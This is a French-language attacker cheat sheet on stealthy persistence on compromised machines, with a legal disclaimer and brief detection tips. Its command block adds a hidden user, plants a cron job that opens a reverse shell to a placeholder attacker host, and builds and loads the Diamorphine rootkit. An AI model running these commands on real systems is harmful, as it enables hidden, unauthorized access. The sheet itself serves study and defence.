# Persistence Furtive

> ⚠️ **Avertissement légal et éthique** :
> Les techniques décrites ici sont à but pédagogique et doivent être utilisées uniquement dans un environnement de test ou avec une autorisation explicite. Toute utilisation non autorisée est illégale.

## Qu’est-ce que la persistence furtive ?
C’est l’art de maintenir un accès à une machine de façon discrète, en évitant la détection par les administrateurs ou les outils de sécurité.

## Techniques courantes

### 1. **Backdoors cachées**
- Ajout de comptes utilisateurs “fantômes”
- Modification de scripts de démarrage (cron, .bashrc, services systemd)

### 2. **Rootkits et hooks**
- Installation de rootkits pour masquer des processus, fichiers ou connexions
- Utilisation de modules noyau malveillants

### 3. **Persistence dans le cloud**
- Création de clés API ou de comptes secondaires dans AWS/Azure
- Modification de scripts d’auto-scaling ou de déploiement

### 4. **Tâches planifiées furtives**
- Cron jobs avec noms trompeurs ou horaires aléatoires
- Tâches Windows planifiées avec description “système”

## Exemples de commandes
```bash
# Ajout d’un utilisateur caché sous Linux
useradd -M -s /bin/false .hiddenuser

# Cron job discret
(echo "*/37 * * * * bash -i >& /dev/tcp/attacker_ip/4444 0>&1") | crontab -

# Installation d’un rootkit (ex : Diamorphine)
git clone https://github.com/m0nad/Diamorphine.git
cd Diamorphine && make && insmod diamorphine.ko
```

## Défense et détection
- Surveiller les nouveaux comptes, services, tâches planifiées
- Utiliser des outils d’intégrité (AIDE, Tripwire)
- Scanner les modules noyau et rootkits (chkrootkit, rkhunter)

## Pour aller plus loin
- [Diamorphine Rootkit](https://github.com/m0nad/Diamorphine)
- [APT Notes - Persistence](https://github.com/aptnotes/data/blob/master/methods/persistence.md)

*Cette fiche sera enrichie avec de nouvelles techniques. Propose tes trouvailles !* 